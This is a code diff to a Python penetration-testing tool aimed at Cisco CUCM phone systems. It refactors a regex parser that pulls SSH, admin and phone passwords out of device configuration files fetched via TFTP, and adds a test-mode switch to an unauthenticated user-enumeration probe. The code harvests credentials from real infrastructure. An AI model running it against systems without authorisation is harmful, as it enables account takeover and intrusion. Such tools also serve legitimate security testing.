@@ -1038,6 +1038,8 @@ def get_user_devices_unauthenticated(cucm_host, port=UDS_PORT, username='', time
     Probe /cucm-uds/user/{username} with no credentials.
     Returns a list of SEP device names if the server responds 200, else [].
     """
+    if _TEST_MODE:
+        return []
     url = f'https://{cucm_host}:{port}/cucm-uds/user/{quote(username, safe="")}'
     try:
         resp = requests.get(url, verify=False, timeout=timeout)
@@ -1439,6 +1441,52 @@ def run_verify(hosts, pairs, port, threads, db_file):
     return results
 
 
+_CONFIG_SECRET_RE = re.compile(
+    r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|'
+    r'<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|'
+    r'<phonePassword>(\S+)</phonePassword>)'
+)
+
+
+def _parse_config_secrets(content, filename):
+    """Pure parser shared by search_for_secrets and the brute-force result
+    path: scan phone/device config XML line-by-line for embedded credentials.
+
+    Returns (credentials, usernames, user, password, user2, ssh_user, ssh_pass):
+    the first two are lists of (username, password, filename) /
+    (username, filename) tuples; the remaining five are the last-seen values,
+    kept for callers' debug/summary output.
+    """
+    credentials = []
+    usernames = []
+    user = password = user2 = None
+    ssh_user = ssh_pass = None
+    for line in content.split('\n'):
+        match = _CONFIG_SECRET_RE.search(line)
+        if match:
+            if match.group(2):
+                user = match.group(2)
+                usernames.append((user, filename))
+                ssh_user = user
+            if match.group(3):
+                password = match.group(3)
+                ssh_pass = password
+                cred_user = user if user else 'unknown'
+                credentials.append((cred_user, password, filename))
+            if match.group(4):
+                user2 = match.group(4)
+                usernames.append((user2, filename))
+            if match.group(5):
+                password = match.group(5)
+                cred_user = user if user else 'unknown'
+                credentials.append((cred_user, password, filename))
+            if match.group(6):
+                password = match.group(6)
+                cred_user = user if user else 'unknown'
+                credentials.append((cred_user, password, filename))
+    return credentials, usernames, user, password, user2, ssh_user, ssh_pass
+
+
 def search_for_secrets(CUCM_host, filename, use_tftp=True):
     if debug:
         print(f'[DEBUG] Processing config file: {filename}')
@@ -1457,27 +1505,7 @@ def search_for_secrets(CUCM_host, filename, use_tftp=True):
     if debug:
         print(f'[DEBUG] Config file contents for {filename}:\n{lines[:1000]}')
 
-    user = password = user2 = None
-    ssh_user = ssh_pass = None
-    for line in lines.split('\n'):
-        match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)', line)
-        if match:
-            if match.group(2):
-                user = match.group(2)
-                usernames.append((user, filename))
-                ssh_user = user
-            if match.group(3):
-                password = match.group(3)
-                ssh_pass = password
-                cred_user = user if user else 'unknown'
-                credentials.append((cred_user, password, filename))
-            if match.group(4):
-                user2 = match.group(4)
-                usernames.append((user2, filename))
-            if match.group(5):
-                password = match.group(5)
-                cred_user = user if user else 'unknown'
-                credentials.append((cred_user, password, filename))
+    credentials, usernames, user, password, user2, ssh_user, ssh_pass = _parse_config_secrets(lines, filename)
     if _TEST_MODE and ssh_user and ssh_pass:
         credentials = [(ssh_user, ssh_pass, filename)] + [c for c in credentials if c[0] != ssh_user or c[1] != ssh_pass]
     if debug:
@@ -3335,29 +3363,9 @@ def main():
             devices_with_users = {}
             
             for device_key, content in all_configs:
-                # Search for secrets in this config
-                config_creds = []
-                config_users = []
-
-                # Track username across the config file
-                user = ''
-                user2 = ''
-
-                for line in content.split('\n'):
-                    match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)',line)
-                    if match:
-                        if match.group(2):
-                            user = match.group(2)
-                            config_users.append((user, device_key))
-                        if match.group(3):
-                            password = match.group(3)
-                            config_creds.append((user, password, device_key))
-                        if match.group(4):
-                            user2 = match.group(4)
-                            config_users.append((user2, device_key))
-                        if match.group(5):
-                            password = match.group(5)
-                            config_creds.append((user if user else 'unknown', password, device_key))
+                # Search for secrets in this config (shared parser with search_for_secrets)
+                config_creds, config_users, _user, _password, _user2, _ssh_user, _ssh_pass = \
+                    _parse_config_secrets(content, device_key)
 
                 # Track devices with findings
                 if config_creds:
@@ -3446,7 +3454,9 @@ def main():
                     file_names = []
                 for file in file_names:
                     print(f'Connecting to {CUCM_host} and getting config for {host["ip"]}/{host["hostname"]}')
-                    search_for_secrets(CUCM_host, file, use_tftp)
+                    file_creds, file_users = search_for_secrets(CUCM_host, file, use_tftp)
+                    found_credentials.extend(file_creds)
+                    found_usernames.extend(file_users)
                 if found_credentials != []:
                     print('Credentials Found in Configurations!')
                 for cred in found_credentials:
